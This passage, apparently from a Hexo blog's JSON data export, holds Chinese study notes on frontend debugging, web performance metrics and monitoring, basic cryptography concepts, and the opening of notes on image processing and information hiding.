title=\"核心web指标\"></a>核心web指标</h5><ul>\n<li>LCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；</li>\n<li>FID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；</li>\n<li>CLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；</li>\n</ul>\n<h2 id=\"三、移动端Debug\"><a href=\"#三、移动端Debug\" class=\"headerlink\" title=\"三、移动端Debug\"></a>三、移动端Debug</h2><h3 id=\"1-调试方法\"><a href=\"#1-调试方法\" class=\"headerlink\" title=\"1.调试方法\"></a>1.调试方法</h3><ul>\n<li>真机调试；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/cd81bc4c19058ed3.jpg\"></p>\n<ul>\n<li>VConsole</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/c349839e8323843c.jpg\"></p>\n<ul>\n<li><p>代理工具（Charles推荐但收费、Progress）</p>\n</li>\n<li><p>NodeJS调试</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">//step1<br>node --inspect=8888 index.js<br><br>//step2<br>//chrome浏览器访问<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用vscode进行调试</li>\n</ul>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">启动调试-&gt;打开网址-&gt;添加断点<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"四、前端常用调试方法\"><a href=\"#四、前端常用调试方法\" class=\"headerlink\" title=\"四、前端常用调试方法\"></a>四、前端常用调试方法</h2><h3 id=\"1-线上即时修改-Overrides\"><a href=\"#1-线上即时修改-Overrides\" class=\"headerlink\" title=\"1.线上即时修改 Overrides\"></a>1.线上即时修改 Overrides</h3><ul>\n<li>打开Sources面板下的Overrides</li>\n<li>点击Select folders for overrides,选择本地空文件夹</li>\n<li>允许授权</li>\n<li>在page种修改代码，然后保存</li>\n<li>打开devTools,点击右上角的三个小点-&gt;more tools-&gt;changes就能看到所有的修改了</li>\n</ul>\n<h3 id=\"2-利用代理解决开发阶段的跨域问题\"><a href=\"#2-利用代理解决开发阶段的跨域问题\" class=\"headerlink\" title=\"2.利用代理解决开发阶段的跨域问题\"></a>2.利用代理解决开发阶段的跨域问题</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/a8bc42e162606f74.jpg\"></p>\n<h5 id=\"问题-1\"><a href=\"#问题-1\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>为什么使用代理可以解决跨域问题？</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\"><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>配置到线上的使用nginx解决跨域问题；</li>\n</ul>\n<h3 id=\"3-使用代理工具Mock数据\"><a href=\"#3-使用代理工具Mock数据\" class=\"headerlink\" title=\"3.使用代理工具Mock数据\"></a>3.使用代理工具Mock数据</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/6174410f7146a1dc.jpg\"></p>\n<h3 id=\"4-小黄鸭调试大法\"><a href=\"#4-小黄鸭调试大法\" class=\"headerlink\" title=\"4.小黄鸭调试大法\"></a>4.小黄鸭调试大法</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/55b236ba9e0415bc.jpg\"></p>\n"},{"title":"前端监控SDK","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg13.jpg","_content":"\n\n# 前端监控SDK\n\n## 一、为什么要聊前端监控？\n\n### 1.经典面试题\n\n> Q：在浏览器里，从输入url到页面展示，这中间发生了什么？\n\n##### 浏览网页出现的问题\n\n- 打开缓慢（使用的xp+ie，建议升级系统）\n- 卡顿（电脑配置太差，建议升级硬件）\n- 图片裂开（用户网络太差，建议升级宽带）\n- 白屏（在我电脑上没问题啊！！）\n\n> 前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；\n\n##### 监控页面质量的意义\n\n- 减少等待时间，提升流量和注册量\n- 减少加载时间，转化率提升、跳出率降低\n\n### 2.前端监控内容\n\n- 性能指标\n- 异常事件\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/b036f881035999c6.jpg)\n\n## 二、常用性能指标\n\n### 1.以用户为中心的性能指标\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/6bc30cec8a9bb5f3.jpg)\n\n- FP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；\n\n- FCP：首次有内容渲染的时间点；\n- FMP：首次绘制有意义内容的时间点；\n- TTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；\n- SI（Speed Index）：衡量页面可视区域加载速度；\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/5b5921ad1952f52a.jpg)\n\n> A和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；\n\n- FID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；\n\n- LCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；\n\n优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报\n\n- TBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/d6ec168427ced5ef.jpg)\n\n长任务：如果一个任务在主线程上运行超过50ms，就是长任务\n\n- CLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-\n\n点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；\n\n## 三、前端常见异常\n\n### 1.静态资源错误\n\n> 所需要的html、css、js以及图片等其他多媒体文件；\n>\n> 静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；\n\n### 2.请求异常\n\n- 100-199（信息响应）\n- 200-299（成功响应）\n- 300-399（重定向）\n- 400-499（客户端错误）\n- 500-599（服务端错误）\n\n请求异常=请求响应状态码>=400;\n\n对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；\n\n状态码为0：\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/f4b5b3dc5ffd4542.jpg)\n\n### 3. js错误\n\njs错误会严重影响页面的正常渲染与交互，是前端监控的重点；\n\n### 4.白屏异常\n\n通常可以通过判断DOM树的结构来粗略判断白屏是否发生；\n\n- js错误导致关键资源渲染失败\n- 请求异常\n- 长时间的js线程繁忙阻塞渲染任务\n\n## 四、性能指标监控\n\n### 1.Perfomance\n\nWeb Api接口；\n\nPerformance Observer；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/前端监控SDK.md","raw":"---\ntitle: 前端监控SDK\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 面试笔记\n    - 笔记\nmp3: \ncover: img/bg13.jpg\n---\n\n\n# 前端监控SDK\n\n## 一、为什么要聊前端监控？\n\n### 1.经典面试题\n\n> Q：在浏览器里，从输入url到页面展示，这中间发生了什么？\n\n##### 浏览网页出现的问题\n\n- 打开缓慢（使用的xp+ie，建议升级系统）\n- 卡顿（电脑配置太差，建议升级硬件）\n- 图片裂开（用户网络太差，建议升级宽带）\n- 白屏（在我电脑上没问题啊！！）\n\n> 前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；\n\n##### 监控页面质量的意义\n\n- 减少等待时间，提升流量和注册量\n- 减少加载时间，转化率提升、跳出率降低\n\n### 2.前端监控内容\n\n- 性能指标\n- 异常事件\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/b036f881035999c6.jpg)\n\n## 二、常用性能指标\n\n### 1.以用户为中心的性能指标\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/6bc30cec8a9bb5f3.jpg)\n\n- FP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；\n\n- FCP：首次有内容渲染的时间点；\n- FMP：首次绘制有意义内容的时间点；\n- TTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；\n- SI（Speed Index）：衡量页面可视区域加载速度；\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/5b5921ad1952f52a.jpg)\n\n> A和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；\n\n- FID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；\n\n- LCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；\n\n优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报\n\n- TBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/d6ec168427ced5ef.jpg)\n\n长任务：如果一个任务在主线程上运行超过50ms，就是长任务\n\n- CLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-\n\n点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；\n\n## 三、前端常见异常\n\n### 1.静态资源错误\n\n> 所需要的html、css、js以及图片等其他多媒体文件；\n>\n> 静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；\n\n### 2.请求异常\n\n- 100-199（信息响应）\n- 200-299（成功响应）\n- 300-399（重定向）\n- 400-499（客户端错误）\n- 500-599（服务端错误）\n\n请求异常=请求响应状态码>=400;\n\n对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；\n\n状态码为0：\n\n![](https://s3.bmp.ovh/imgs/2023/02/07/f4b5b3dc5ffd4542.jpg)\n\n### 3. js错误\n\njs错误会严重影响页面的正常渲染与交互，是前端监控的重点；\n\n### 4.白屏异常\n\n通常可以通过判断DOM树的结构来粗略判断白屏是否发生；\n\n- js错误导致关键资源渲染失败\n- 请求异常\n- 长时间的js线程繁忙阻塞渲染任务\n\n## 四、性能指标监控\n\n### 1.Perfomance\n\nWeb Api接口；\n\nPerformance Observer；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"前端监控SDK","published":1,"updated":"2023-03-27T11:06:37.681Z","_id":"clg29vyhu0051ao9c6k7oahf1","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前端监控SDK\"><a href=\"#前端监控SDK\" class=\"headerlink\" title=\"前端监控SDK\"></a>前端监控SDK</h1><h2 id=\"一、为什么要聊前端监控？\"><a href=\"#一、为什么要聊前端监控？\" class=\"headerlink\" title=\"一、为什么要聊前端监控？\"></a>一、为什么要聊前端监控？</h2><h3 id=\"1-经典面试题\"><a href=\"#1-经典面试题\" class=\"headerlink\" title=\"1.经典面试题\"></a>1.经典面试题</h3><blockquote>\n<p>Q：在浏览器里，从输入url到页面展示，这中间发生了什么？</p>\n</blockquote>\n<h5 id=\"浏览网页出现的问题\"><a href=\"#浏览网页出现的问题\" class=\"headerlink\" title=\"浏览网页出现的问题\"></a>浏览网页出现的问题</h5><ul>\n<li>打开缓慢（使用的xp+ie，建议升级系统）</li>\n<li>卡顿（电脑配置太差，建议升级硬件）</li>\n<li>图片裂开（用户网络太差，建议升级宽带）</li>\n<li>白屏（在我电脑上没问题啊！！）</li>\n</ul>\n<blockquote>\n<p>前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；</p>\n</blockquote>\n<h5 id=\"监控页面质量的意义\"><a href=\"#监控页面质量的意义\" class=\"headerlink\" title=\"监控页面质量的意义\"></a>监控页面质量的意义</h5><ul>\n<li>减少等待时间，提升流量和注册量</li>\n<li>减少加载时间，转化率提升、跳出率降低</li>\n</ul>\n<h3 id=\"2-前端监控内容\"><a href=\"#2-前端监控内容\" class=\"headerlink\" title=\"2.前端监控内容\"></a>2.前端监控内容</h3><ul>\n<li>性能指标</li>\n<li>异常事件</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/b036f881035999c6.jpg\"></p>\n<h2 id=\"二、常用性能指标\"><a href=\"#二、常用性能指标\" class=\"headerlink\" title=\"二、常用性能指标\"></a>二、常用性能指标</h2><h3 id=\"1-以用户为中心的性能指标\"><a href=\"#1-以用户为中心的性能指标\" class=\"headerlink\" title=\"1.以用户为中心的性能指标\"></a>1.以用户为中心的性能指标</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/6bc30cec8a9bb5f3.jpg\"></p>\n<ul>\n<li><p>FP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；</p>\n</li>\n<li><p>FCP：首次有内容渲染的时间点；</p>\n</li>\n<li><p>FMP：首次绘制有意义内容的时间点；</p>\n</li>\n<li><p>TTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；</p>\n</li>\n<li><p>SI（Speed Index）：衡量页面可视区域加载速度；</p>\n</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/5b5921ad1952f52a.jpg\"></p>\n<blockquote>\n<p>A和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；</p>\n</blockquote>\n<ul>\n<li><p>FID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；</p>\n</li>\n<li><p>LCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；</p>\n</li>\n</ul>\n<p>优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报</p>\n<ul>\n<li>TBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/d6ec168427ced5ef.jpg\"></p>\n<p>长任务：如果一个任务在主线程上运行超过50ms，就是长任务</p>\n<ul>\n<li>CLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-</li>\n</ul>\n<p>点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；</p>\n<h2 id=\"三、前端常见异常\"><a href=\"#三、前端常见异常\" class=\"headerlink\" title=\"三、前端常见异常\"></a>三、前端常见异常</h2><h3 id=\"1-静态资源错误\"><a href=\"#1-静态资源错误\" class=\"headerlink\" title=\"1.静态资源错误\"></a>1.静态资源错误</h3><blockquote>\n<p>所需要的html、css、js以及图片等其他多媒体文件；</p>\n<p>静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；</p>\n</blockquote>\n<h3 id=\"2-请求异常\"><a href=\"#2-请求异常\" class=\"headerlink\" title=\"2.请求异常\"></a>2.请求异常</h3><ul>\n<li>100-199（信息响应）</li>\n<li>200-299（成功响应）</li>\n<li>300-399（重定向）</li>\n<li>400-499（客户端错误）</li>\n<li>500-599（服务端错误）</li>\n</ul>\n<p>请求异常=请求响应状态码&gt;=400;</p>\n<p>对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；</p>\n<p>状态码为0：</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/f4b5b3dc5ffd4542.jpg\"></p>\n<h3 id=\"3-js错误\"><a href=\"#3-js错误\" class=\"headerlink\" title=\"3. js错误\"></a>3. js错误</h3><p>js错误会严重影响页面的正常渲染与交互，是前端监控的重点；</p>\n<h3 id=\"4-白屏异常\"><a href=\"#4-白屏异常\" class=\"headerlink\" title=\"4.白屏异常\"></a>4.白屏异常</h3><p>通常可以通过判断DOM树的结构来粗略判断白屏是否发生；</p>\n<ul>\n<li>js错误导致关键资源渲染失败</li>\n<li>请求异常</li>\n<li>长时间的js线程繁忙阻塞渲染任务</li>\n</ul>\n<h2 id=\"四、性能指标监控\"><a href=\"#四、性能指标监控\" class=\"headerlink\" title=\"四、性能指标监控\"></a>四、性能指标监控</h2><h3 id=\"1-Perfomance\"><a href=\"#1-Perfomance\" class=\"headerlink\" title=\"1.Perfomance\"></a>1.Perfomance</h3><p>Web Api接口；</p>\n<p>Performance Observer；</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前端监控SDK\"><a href=\"#前端监控SDK\" class=\"headerlink\" title=\"前端监控SDK\"></a>前端监控SDK</h1><h2 id=\"一、为什么要聊前端监控？\"><a href=\"#一、为什么要聊前端监控？\" class=\"headerlink\" title=\"一、为什么要聊前端监控？\"></a>一、为什么要聊前端监控？</h2><h3 id=\"1-经典面试题\"><a href=\"#1-经典面试题\" class=\"headerlink\" title=\"1.经典面试题\"></a>1.经典面试题</h3><blockquote>\n<p>Q：在浏览器里，从输入url到页面展示，这中间发生了什么？</p>\n</blockquote>\n<h5 id=\"浏览网页出现的问题\"><a href=\"#浏览网页出现的问题\" class=\"headerlink\" title=\"浏览网页出现的问题\"></a>浏览网页出现的问题</h5><ul>\n<li>打开缓慢（使用的xp+ie，建议升级系统）</li>\n<li>卡顿（电脑配置太差，建议升级硬件）</li>\n<li>图片裂开（用户网络太差，建议升级宽带）</li>\n<li>白屏（在我电脑上没问题啊！！）</li>\n</ul>\n<blockquote>\n<p>前端监控通过对页面数据的采集和上报，来帮助开发者更快速的对质量差的页面进行分析与归因；</p>\n</blockquote>\n<h5 id=\"监控页面质量的意义\"><a href=\"#监控页面质量的意义\" class=\"headerlink\" title=\"监控页面质量的意义\"></a>监控页面质量的意义</h5><ul>\n<li>减少等待时间，提升流量和注册量</li>\n<li>减少加载时间，转化率提升、跳出率降低</li>\n</ul>\n<h3 id=\"2-前端监控内容\"><a href=\"#2-前端监控内容\" class=\"headerlink\" title=\"2.前端监控内容\"></a>2.前端监控内容</h3><ul>\n<li>性能指标</li>\n<li>异常事件</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/b036f881035999c6.jpg\"></p>\n<h2 id=\"二、常用性能指标\"><a href=\"#二、常用性能指标\" class=\"headerlink\" title=\"二、常用性能指标\"></a>二、常用性能指标</h2><h3 id=\"1-以用户为中心的性能指标\"><a href=\"#1-以用户为中心的性能指标\" class=\"headerlink\" title=\"1.以用户为中心的性能指标\"></a>1.以用户为中心的性能指标</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/6bc30cec8a9bb5f3.jpg\"></p>\n<ul>\n<li><p>FP：首次渲染的时间点，FP时间点之前，用户看到的都是空白的白屏；</p>\n</li>\n<li><p>FCP：首次有内容渲染的时间点；</p>\n</li>\n<li><p>FMP：首次绘制有意义内容的时间点；</p>\n</li>\n<li><p>TTI：测量页面从开始加载到主要子资源完成渲染并能够快速可靠的响应用户输入所需的时间。TTI越小用户能越早交互；</p>\n</li>\n<li><p>SI（Speed Index）：衡量页面可视区域加载速度；</p>\n</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/5b5921ad1952f52a.jpg\"></p>\n<blockquote>\n<p>A和B的首次内容出现和加载时间完全一样，但是A的用户体验更好；</p>\n</blockquote>\n<ul>\n<li><p>FID（First Input Delay）：测量从用户第一次与页面交互（点击、按钮）知道浏览器对交互做出响应实际能够处理事件时所经过的时间；</p>\n</li>\n<li><p>LCP（Largest Contentful Paint）：最大的内容在可视区域内变得可见的时间点；</p>\n</li>\n</ul>\n<p>优点：1.容易理解 2.给出结果与FMP结果相似 3.容易计算和上报</p>\n<ul>\n<li>TBT（Total Blocking TIme）：量化主线程在空闲之前的繁忙程度，有助于理解在加载是啊金，页面无法响应用户输入的时间有多久；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/d6ec168427ced5ef.jpg\"></p>\n<p>长任务：如果一个任务在主线程上运行超过50ms，就是长任务</p>\n<ul>\n<li>CLS（Cumulative Layout Shift）：量化了 在页面加载期间，视口内元素的移动程度；-</li>\n</ul>\n<p>点击按钮的时候，页面突然出现了内容或者文本下移等类似的问题，对用户操作产生影响；</p>\n<h2 id=\"三、前端常见异常\"><a href=\"#三、前端常见异常\" class=\"headerlink\" title=\"三、前端常见异常\"></a>三、前端常见异常</h2><h3 id=\"1-静态资源错误\"><a href=\"#1-静态资源错误\" class=\"headerlink\" title=\"1.静态资源错误\"></a>1.静态资源错误</h3><blockquote>\n<p>所需要的html、css、js以及图片等其他多媒体文件；</p>\n<p>静态资源错误：在拉取和加载静态资源的过程中发生了预期之外的错误，如网络异常等；</p>\n</blockquote>\n<h3 id=\"2-请求异常\"><a href=\"#2-请求异常\" class=\"headerlink\" title=\"2.请求异常\"></a>2.请求异常</h3><ul>\n<li>100-199（信息响应）</li>\n<li>200-299（成功响应）</li>\n<li>300-399（重定向）</li>\n<li>400-499（客户端错误）</li>\n<li>500-599（服务端错误）</li>\n</ul>\n<p>请求异常=请求响应状态码&gt;=400;</p>\n<p>对于异步请求拉取的静态资源错误也可以选择归纳为请求异常；</p>\n<p>状态码为0：</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/f4b5b3dc5ffd4542.jpg\"></p>\n<h3 id=\"3-js错误\"><a href=\"#3-js错误\" class=\"headerlink\" title=\"3. js错误\"></a>3. js错误</h3><p>js错误会严重影响页面的正常渲染与交互，是前端监控的重点；</p>\n<h3 id=\"4-白屏异常\"><a href=\"#4-白屏异常\" class=\"headerlink\" title=\"4.白屏异常\"></a>4.白屏异常</h3><p>通常可以通过判断DOM树的结构来粗略判断白屏是否发生；</p>\n<ul>\n<li>js错误导致关键资源渲染失败</li>\n<li>请求异常</li>\n<li>长时间的js线程繁忙阻塞渲染任务</li>\n</ul>\n<h2 id=\"四、性能指标监控\"><a href=\"#四、性能指标监控\" class=\"headerlink\" title=\"四、性能指标监控\"></a>四、性能指标监控</h2><h3 id=\"1-Perfomance\"><a href=\"#1-Perfomance\" class=\"headerlink\" title=\"1.Perfomance\"></a>1.Perfomance</h3><p>Web Api接口；</p>\n<p>Performance Observer；</p>\n"},{"title":"密码学","date":"2020-11-03T13:44:45.000Z","mp3":null,"cover":"img/mimaxue.jpg","_content":"\n# 密码学概念总结\n\n> 专注于密钥的保护而不是加密算法\n\n## 1.对称密码\n\t\tAlice和Bob使用相同的密钥和加密算法.\n\t\t在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.\n\t\t因此需要好耗费人力和金钱安全传送密钥,\n\t\t同时,一次会话使用一个密钥,导致密钥的保存冗杂.\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201103214135788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n## 2.公钥密码 \n\t\t使用公钥和密钥的加密算法.\n\t\tA在网络中展示自己的公钥,所有人可以获取并使用.\n\t\tB想和A通信,则从网络中获得A的公钥,并对密文进行加密.\n\t\tA的私钥可以解密A的公钥加密过的密文,所以只有A能解密.\n\t\t防止了中间人攻击.\n\n## 3.混合密码\n\t\t使用对称密码加密明文,使用公钥加密对称密码算法的密钥.\n\t\t目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源\n\t\t使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.\n","source":"_posts/密码学.md","raw":"---\ntitle: 密码学\ndate: 2020-11-3 21:44:45\ncategories: \n    - 密码学\ntags: \n    - 密码学\n    - 概论\nmp3: \ncover: img/mimaxue.jpg\n---\n\n# 密码学概念总结\n\n> 专注于密钥的保护而不是加密算法\n\n## 1.对称密码\n\t\tAlice和Bob使用相同的密钥和加密算法.\n\t\t在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.\n\t\t因此需要好耗费人力和金钱安全传送密钥,\n\t\t同时,一次会话使用一个密钥,导致密钥的保存冗杂.\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201103214135788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n## 2.公钥密码 \n\t\t使用公钥和密钥的加密算法.\n\t\tA在网络中展示自己的公钥,所有人可以获取并使用.\n\t\tB想和A通信,则从网络中获得A的公钥,并对密文进行加密.\n\t\tA的私钥可以解密A的公钥加密过的密文,所以只有A能解密.\n\t\t防止了中间人攻击.\n\n## 3.混合密码\n\t\t使用对称密码加密明文,使用公钥加密对称密码算法的密钥.\n\t\t目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源\n\t\t使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.\n","slug":"密码学","published":1,"updated":"2020-11-03T13:44:46.000Z","_id":"clg29vyhv0055ao9c7vlm217p","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"密码学概念总结\"><a href=\"#密码学概念总结\" class=\"headerlink\" title=\"密码学概念总结\"></a>密码学概念总结</h1><blockquote>\n<p>专注于密钥的保护而不是加密算法</p>\n</blockquote>\n<h2 id=\"1-对称密码\"><a href=\"#1-对称密码\" class=\"headerlink\" title=\"1.对称密码\"></a>1.对称密码</h2><pre><code class=\"hljs\">    Alice和Bob使用相同的密钥和加密算法.\n    在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.\n    因此需要好耗费人力和金钱安全传送密钥,\n    同时,一次会话使用一个密钥,导致密钥的保存冗杂.\n</code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/20201103214135788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"2-公钥密码\"><a href=\"#2-公钥密码\" class=\"headerlink\" title=\"2.公钥密码\"></a>2.公钥密码</h2><pre><code class=\"hljs\">    使用公钥和密钥的加密算法.\n    A在网络中展示自己的公钥,所有人可以获取并使用.\n    B想和A通信,则从网络中获得A的公钥,并对密文进行加密.\n    A的私钥可以解密A的公钥加密过的密文,所以只有A能解密.\n    防止了中间人攻击.\n</code></pre>\n<h2 id=\"3-混合密码\"><a href=\"#3-混合密码\" class=\"headerlink\" title=\"3.混合密码\"></a>3.混合密码</h2><pre><code class=\"hljs\">    使用对称密码加密明文,使用公钥加密对称密码算法的密钥.\n    目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源\n    使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"密码学概念总结\"><a href=\"#密码学概念总结\" class=\"headerlink\" title=\"密码学概念总结\"></a>密码学概念总结</h1><blockquote>\n<p>专注于密钥的保护而不是加密算法</p>\n</blockquote>\n<h2 id=\"1-对称密码\"><a href=\"#1-对称密码\" class=\"headerlink\" title=\"1.对称密码\"></a>1.对称密码</h2><pre><code>    Alice和Bob使用相同的密钥和加密算法.\n    在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.\n    因此需要好耗费人力和金钱安全传送密钥,\n    同时,一次会话使用一个密钥,导致密钥的保存冗杂.\n</code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/20201103214135788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"2-公钥密码\"><a href=\"#2-公钥密码\" class=\"headerlink\" title=\"2.公钥密码\"></a>2.公钥密码</h2><pre><code>    使用公钥和密钥的加密算法.\n    A在网络中展示自己的公钥,所有人可以获取并使用.\n    B想和A通信,则从网络中获得A的公钥,并对密文进行加密.\n    A的私钥可以解密A的公钥加密过的密文,所以只有A能解密.\n    防止了中间人攻击.\n</code></pre>\n<h2 id=\"3-混合密码\"><a href=\"#3-混合密码\" class=\"headerlink\" title=\"3.混合密码\"></a>3.混合密码</h2><pre><code>    使用对称密码加密明文,使用公钥加密对称密码算法的密钥.\n    目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源\n    使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.\n</code></pre>\n"},{"title":"图像信号处理基础","date":"2022-10-29T07:09:00.000Z","mp3":null,"cover":"img/2.jpg","_content":"\n\n# 图像信号处理基础\n\n### 一、图像信号基础\n\n#### 1.图像表示\n\n像素点\n\n#### 2.图像压缩方法\n\nJPEG等；\n\n![](https://s3.bmp.ovh/imgs/2022/10/28/b46fcc4dbfac830a.png)\n\n#### 3.常用图像处理方法\n\n- 二维DFT\n- 二维DWT\n- 二维DCT\n\n### 二、信息隐藏基本原理\n\n#### 1.信息隐藏概念\n\n不可视通信，阈下通信\n$$\nC 载体对象；M 秘密信息； C'伪装对象；\n$$\n![](https://s3.bmp.ovh/imgs/2022/10/28/810382446257649f.png)\n\n纯粹安全性：第三方有没有能力将载体对象和伪装对象区分；\n\n#### 2.载体选择\n\n冗余空间、声音图像、载体样本使用次数仅1；\n\n### 三、信息隐藏技术\n\n#### （一）时域替换技术\n\n#### 